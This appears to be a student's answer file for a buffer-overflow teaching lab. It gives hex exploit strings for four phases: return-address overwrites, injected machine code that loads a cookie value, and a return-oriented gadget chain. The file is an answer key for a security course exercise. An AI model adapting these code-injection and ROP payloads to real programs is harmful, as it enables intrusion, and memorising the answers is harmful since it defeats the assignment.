/* Phase 1 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a5 12 40 00 00 00 00 00

/* Phase 2 */
48 c7 c7 48 27 db 19 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
58 d8 62 55 00 00 00 00
d1 12 40 00 00 00 00 00

/* Phase 3 */
48 c7 c7 80 d8 62 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
58 d8 62 55 00 00 00 00
e2 13 40 00 00 00 00 00
31 39 64 62 32 37 34 38

/* Phase 4 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
9f 14 40 00 00 00 00 00
48 27 db 19 00 00 00 00
b0 14 40 00 00 00 00 00
d1 12 40 00 00 00 00 00

/* Phase 1 */



